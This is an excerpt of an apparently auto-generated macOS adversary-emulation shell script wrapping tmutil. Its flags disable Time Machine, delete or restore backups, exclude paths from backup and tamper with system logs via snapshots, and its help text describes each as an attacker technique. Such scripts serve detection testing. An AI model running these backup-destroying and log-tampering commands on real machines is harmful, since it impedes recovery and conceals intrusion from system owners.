...
DISABLE_TIME_MACHINE=false
DELETE_A_BACKUP=false
RESTORE_A_BACKUP=false
TAMPER_WITH_SYSTEM_LOGS=false
EXCLUDE_PATH_FROM_BACKUP=false
...
PROCEDURE_NAME="tmutil"  # Set by build system from YAML procedure_name field
...
# We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
        --disable-time-machine)
            ...
            ;;
        --delete-a-backup)
            DELETE_A_BACKUP=true
            ;;
        --restore-a-backup)
            RESTORE_A_BACKUP=true
            ;;
        --tamper-with-system-logs)
            TAMPER_WITH_SYSTEM_LOGS=true
            ;;
        --exclude-path-from-backup)
            EXCLUDE_PATH_FROM_BACKUP=true
            ;;
            *)
...
SCRIPT:
  --disable-time-machine           The following command disables Time Machine. An attacker can use this to prevent backups from occurr
  --delete-a-backup                The following command deletes the specified backup. An adversary may perform this action before laun
  --restore-a-backup               The following command restore the specified backup. An attacker can use this to restore a backup of 
  --tamper-with-system-logs        An adversary can use the snapshot and restore commands together to tamper with system logs. This is 
  --exclude-path-from-backup       An adversary could exclude a path from Time Machine backups to prevent certain files from being back
...
# Execute functions for --disable-time-machine
if [ "$DISABLE_TIME_MACHINE" = true ]; then
    core_debug_print "Executing functions for --disable-time-machine"
    result=$(execute_function execute_disable_time_machine)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --delete-a-backup
if [ "$DELETE_A_BACKUP" = true ]; then
    core_debug_print "Executing functions for --delete-a-backup"
    result=$(execute_function execute_delete_backup)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --restore-a-backup
if [ "$RESTORE_A_BACKUP" = true ]; then
    core_debug_print "Executing functions for --restore-a-backup"
    result=$(execute_function execute_restore_backup)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --tamper-with-system-logs
if [ "$TAMPER_WITH_SYSTEM_LOGS" = true ]; then
    core_debug_print "Executing functions for --tamper-with-system-logs"
    result=$(execute_function execute_tamper_system_logs)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --exclude-path-from-backup
if [ "$EXCLUDE_PATH_FROM_BACKUP" = true ]; then
    core_debug_print "Executing functions for --exclude-path-from-backup"
    result=$(execute_function execute_exclude_path_from_backup)
    raw_output="${raw_output}${result}"
fi
...
# Function: execute_disable_time_machine
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_disable_time_machine() {
    local result
    result=$(tmutil disable 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_delete_backup
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required
...
execute_delete_backup() {
    local result
    result=$(tmutil delete /path/to/backup 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_restore_backup
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required
...
execute_restore_backup() {
    local result
    result=$(tmutil restore /path/to/backup 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_tamper_system_logs
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_tamper_system_logs() {
    local result
    result=$(mkdir /tmp/snapshot
...
tmutil restore com.apple.TimeMachine.2023-05-01-090000.local 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_exclude_path_from_backup
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_exclude_path_from_backup() {
    local result
    result=$(tmutil addexclusion /path/to/exclude 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}
